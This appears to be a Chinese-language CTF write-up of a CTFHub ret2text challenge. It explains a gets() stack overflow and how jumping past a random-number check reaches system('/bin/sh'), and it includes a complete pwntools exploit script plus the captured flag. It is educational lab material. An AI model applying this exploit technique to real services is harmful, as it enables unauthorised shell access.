---
title: ret2text 后门函数跳过随机数校验
date: 2026-05-09 19:56:00
categories:
  - pwn
tags:
  - 栈溢出
  - ret2text
  - 后门函数
  - 栈对齐
  - 64位
---

> CTFHub ret2text | 跳过伪随机数验证，直接劫持到 system("/bin/sh")

## 0x01 题目环境

| 项目 | 内容 |
|------|------|
| 题目类型 | 基础栈溢出 / ret2text |
| 保护机制 | 64位，NX 开启，无 Canary |
| 核心漏洞 | `gets()` 无边界检查 |

## 0x02 漏洞分析

IDA 反汇编发现致命漏洞：程序使用了危险函数 `gets()`。

```asm
sub     rsp, 70h                ; 分配 0x70 栈空间
lea     rax, [rbp+var_70]
mov     rdi, rax
call    _gets                   ; 致命漏洞：不检查输入长度
```

**偏移量计算**：
- 缓冲区大小：`0x70` = 112 字节
- 覆盖 RBP：8 字节
- **总偏移量：112 + 8 = 120 字节**

## 0x03 后门函数与陷阱绕过

程序中有 `secure` 后门函数，但藏有陷阱：

```asm
call    _time
call    _srand
call    _rand                   ; 生成随机数
call    ___isoc99_scanf         ; 要求用户输入数字
cmp     [rbp+var_4], eax        ; 比较用户输入和随机数
jnz     short loc_4007C4        ; 不相等则跳过
lea     rdi, command            ; "/bin/sh"
call    _system
```

**解题思路**：不能直接跳到 `secure` 函数开头（无法预测随机数），而是**直接跳过比较过程**，劫持到 `lea rdi, command` 所在地址 `0x4007B8`。

## 0x04 栈对齐的巧妙解决

**坑点**：64位 glibc 要求调用 `system` 时 `rsp` 必须 16 字节对齐，否则触发 Segfault。

**巧妙之处**：由于直接跳到函数中间 `0x4007B8`，**完美避开了 `push rbp` 指令**，栈指针恰好满足 16 字节对齐，无需额外拼接 `ret` 地址。

## 0x05 Exploit 代码

```python
from pwn import *

p = remote("challenge-1cfa4b5c7c14cabf.sandbox.ctfhub.com", 36750)

offset = 120            # 溢出到返回地址的偏移量
shell_addr = 0x4007B8   # 跳过随机数验证，直接加载 "/bin/sh"

payload = b'A' * offset + p64(shell_addr)

p.recvuntil(b"Input someti")
p.sendline(payload)
p.interactive()
```

## 0x06 执行结果

```bash
ctfhub{a09ac83246b302ff8647accc}
```

## 0x07 核心考点

- **ret2text**：将返回地址劫持到程序自带的后门代码
- **陷阱绕过**：跳过随机数比较，直接执行 `system("/bin/sh")`
- **栈对齐**：64位程序调用 `system` 需要 16 字节对齐
- **地址精确定位**：通过 IDA 确定 `lea rdi, command` 的精确地址
